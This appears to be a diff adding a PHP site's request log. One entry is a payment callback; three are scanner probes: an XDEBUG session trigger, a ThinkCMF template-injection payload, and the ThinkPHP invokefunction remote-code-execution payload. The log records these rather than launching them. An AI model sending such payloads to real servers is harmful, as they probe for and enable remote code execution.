@@ -1,0 +1,9 @@
+16-09-2020 10:28:03
+GET: {"aksi":"finish","order_id":"T-0021","status_code":"200","transaction_status":"settlement"}
+http://pw-nesia.com/?aksi=finish&order_id=T-0021&status_code=200&transaction_status=settlement
+16-09-2020 14:52:28
+GET: {"XDEBUG_SESSION_START":"phpstorm"}
+16-09-2020 15:05:03
+GET: {"a":"fetch","content":"<php>die(@md5(HelloThinkCMF))<\/php>"}
+16-09-2020 15:15:19
+GET: {"s":"\/Index\/\\think\\app\/invokefunction","function":"call_user_func_array","vars":["md5",["HelloThinkPHP"]]}
